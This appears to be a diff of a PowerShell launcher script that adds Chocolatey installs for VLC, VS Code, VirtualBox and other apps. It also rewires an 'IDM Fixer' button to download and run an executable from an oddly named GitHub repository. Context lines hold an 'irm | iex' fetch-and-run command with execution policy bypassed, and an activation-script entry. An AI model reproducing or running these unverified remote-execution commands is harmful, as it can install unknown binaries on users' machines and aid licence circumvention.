@@ -94,7 +94,7 @@ function Run-Coporton {
         "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://coporton.com/ias | iex`""
 }
 
-function Install-IDM {
+function Run-IDM {
     Start-Process cmd -ArgumentList "/k",
         "curl.exe -L -O https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.1/Download.exe && Download.exe"
 }
@@ -174,6 +174,44 @@ function Install-Ngrok {
         "echo Installing ngrok via Chocolatey... && choco install ngrok -y && echo. && echo ngrok installation completed. && pause"
 }
 
+# ============================================================
+#  Other Apps
+# ============================================================
+
+function Install-FastStone {
+    Start-Process cmd -ArgumentList "/k",
+        "echo Installing FastStone Image Viewer via Chocolatey... && choco install faststone-image-viewer -y && echo. && echo FastStone Image Viewer installation completed. && pause"
+}
+
+function Install-VLC {
+    Start-Process cmd -ArgumentList "/k",
+        "echo Installing VLC Media Player via Chocolatey... && choco install vlc.install -y && echo. && echo VLC Media Player installation completed. && pause"
+}
+
+function Install-MPC-HC {
+    Start-Process cmd -ArgumentList "/k",
+        "echo Installing MPC-HC via Chocolatey... && choco install mpc-hc-clsid2 -y && echo. && echo MPC-HC installation completed. && pause"
+}
+
+function Install-AntiGravity-ide {
+    Start-Process cmd -ArgumentList "/k",
+        "echo Installing AntiGravity IDE via Chocolatey... && choco install antigravity-ide -y && echo. && echo AntiGravity IDE installation completed. && pause"
+}
+
+function Install-VSCode {
+    Start-Process cmd -ArgumentList "/k",
+        "echo Installing Visual Studio Code via Chocolatey... && choco install vscode -y && echo. && echo Visual Studio Code installation completed. && pause"
+}
+
+function Install-IDM {
+    Start-Process cmd -ArgumentList "/k",
+        "echo Installing Internet Download Manager via Chocolatey... && choco install internet-download-manager -y && echo. && echo Internet Download Manager installation completed. && pause"
+}
+
+function Install-VirtualBox {
+    Start-Process cmd -ArgumentList "/k",
+        "echo Installing VirtualBox via Chocolatey... && choco install virtualbox -y && echo. && echo VirtualBox installation completed. && pause"
+}
 # ============================================================
 #  Automation
 # ============================================================
@@ -820,14 +858,24 @@ Add-Category -Col 0 -Title "Automation" -Items @(
 
 # Column 1 ---------------------------------------------------------------------
 Add-Category -Col 1 -Title "Recommended Tools" -Items @(
-    @{ Name = "Git";          Func = { Install-Git        } },
-    @{ Name = "Python";       Func = { Install-Python     } },
-    @{ Name = ".NET Runtime"; Func = { Install-Dotnet     } },
-    @{ Name = "FFmpeg";       Func = { Install-FFmpeg     } },
-    @{ Name = "7-Zip";        Func = { Install-7Zip       } },
-    @{ Name = "WinDirStat";   Func = { Install-WinDirStat } },
-    @{ Name = "yt-dlp";       Func = { Install-YTDLP      } },
-    @{ Name = "ngrok";        Func = { Install-Ngrok      } }
+    @{ Name = "Git";                Func = { Install-Git        } },
+    @{ Name = "Python";             Func = { Install-Python     } },
+    @{ Name = ".NET Runtime";       Func = { Install-Dotnet     } },
+    @{ Name = "FFmpeg";             Func = { Install-FFmpeg     } },
+    @{ Name = "7-Zip";              Func = { Install-7Zip       } },
+    @{ Name = "WinDirStat";         Func = { Install-WinDirStat } },
+    @{ Name = "yt-dlp";             Func = { Install-YTDLP      } },
+    @{ Name = "ngrok";              Func = { Install-Ngrok      } }
+)
+
+Add-Category -Col 1 -Title "Other Apps" -Items @(
+    @{ Name = "Fast Stone Image";   Func = { Install-FastStone} },
+    @{ Name = "Vlc";                Func = { Install-VLC} },
+    @{ Name = "MPC HC";             Func = { Install-MPC-HC} },
+    @{ Name = "AntiGravity IDE";    Func = { Install-AntiGravity-ide} },
+    @{ Name = "VS Code";            Func = { Install-VSCode} },
+    @{ Name = "IDM";                Func = { Install-IDM} },
+    @{ Name = "Virtual Box";        Func = { Install-VirtualBox} }
 )
 
 # Column 2 ---------------------------------------------------------------------
@@ -835,7 +883,7 @@ Add-Category -Col 2 -Title "Run Scripts" -Items @(
     @{ Name = "Chris Titus Tool";        Func = { Run-Titus     } },
     @{ Name = "Mass Grave (Activation)"; Func = { Run-MassGrave } },
     @{ Name = "Coporton";                Func = { Run-Coporton  } },
-    @{ Name = "IDM";                     Func = { Install-IDM   } },
+    @{ Name = "IDM Fixer";               Func = { Run-IDM   } },
     @{ Name = "Sparkle";                 Func = { Run-Sparkle   } },
     @{ Name = "GHGrab (GitHub Grabber)"; Func = { Run-GHGrab    } },
     @{ Name = "Tools Installer Setup";   Func = { Run-Setup     } },
